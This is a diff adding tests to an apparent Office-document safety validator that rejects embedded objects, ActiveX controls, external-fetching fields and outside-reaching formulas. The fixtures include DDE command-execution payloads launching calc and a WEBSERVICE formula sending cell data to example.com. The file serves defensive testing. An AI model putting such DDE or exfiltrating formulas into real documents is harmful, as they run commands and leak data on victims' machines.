@@ -60,6 +60,39 @@ describe('officeSafe', () => {
     expect(officeSafe(file)).toEqual({ ok: true });
   });
 
+  it('stops embedded objects and controls, even ones kept inside the package', () => {
+    const ole = changed('sample.docx', 'embedded.docx', (p) => p.set('word/embeddings/oleObject1.bin', Buffer.from('ole')));
+    expect(officeSafe(ole)).toEqual({ ok: false, reason: 'embedded' });
+    const control = changed('sample.pptx', 'control.pptx', (p) => addRel(p, 'ppt/slides/_rels/slide2.xml.rels',
+      `<Relationship Id="rIdC" Type="${REL}/control" Target="../activeX/activeX1.xml"/>`));
+    expect(officeSafe(control)).toEqual({ ok: false, reason: 'embedded' });
+  });
+
+  it('stops fields that fetch or run something, even split across runs; a web link field stays', () => {
+    const field = (code: string) => code.split('|').map((c) => `<w:r><w:instrText xml:space="preserve">${c}</w:instrText></w:r>`).join('');
+    const withBody = (name: string, para: string) => changed('sample.docx', name, (p) => p.set('word/document.xml',
+      Buffer.from(p.get('word/document.xml')!.toString().replace('</w:body>', `<w:p>${para}</w:p></w:body>`))));
+    expect(officeSafe(withBody('dde.docx', field(' DDE|AUTO c:\\windows\\system32\\cmd.exe "/k calc" ')))).toEqual({ ok: false, reason: 'externalLink' });
+    expect(officeSafe(withBody('include.docx', '<w:fldSimple w:instr=" INCLUDEPICTURE &quot;http://example.com/a.png&quot; \d "/>'))).toEqual({ ok: false, reason: 'externalLink' });
+    expect(officeSafe(withBody('hyperlink.docx', field(' HYPERLINK "https://example.com/" ')))).toEqual({ ok: true });
+  });
+
+  it('stops a workbook formula that reaches outside', () => {
+    const formula = (name: string, f: string) => changed('sample.xlsx', name, (p) => p.set('xl/worksheets/sheet1.xml',
+      Buffer.from(p.get('xl/worksheets/sheet1.xml')!.toString().replace(/<f>[^<]*<\/f>/, `<f>${f}</f>`))));
+    for (const [name, f] of [
+      ['webservice.xlsx', 'WEBSERVICE("http://example.com/?"&amp;A1)'],
+      ['dde.xlsx', "cmd|'/c calc'!A0"],
+      ['external.xlsx', '[1]Sheet1!A1'],
+    ]) expect(officeSafe(formula(name, f)), name).toEqual({ ok: false, reason: 'externalLink' });
+    expect(officeSafe(formula('sum.xlsx', 'SUM(B2:B3)'))).toEqual({ ok: true });
+  });
+
+  it('calls a package with two parts of the same name unreadable', () => {
+    const file = changed('sample.docx', 'twice.docx', (p) => p.set('WORD/document.xml', p.get('word/document.xml')!));
+    expect(officeSafe(file)).toEqual({ ok: false, reason: 'unreadable' });
+  });
+
   it('calls what it cannot open unreadable', () => {
     writeFileSync(join(dir, 'garbage.docx'), Buffer.from('this is not a zip file at all'));
     expect(officeSafe(join(dir, 'garbage.docx'))).toEqual({ ok: false, reason: 'unreadable' });
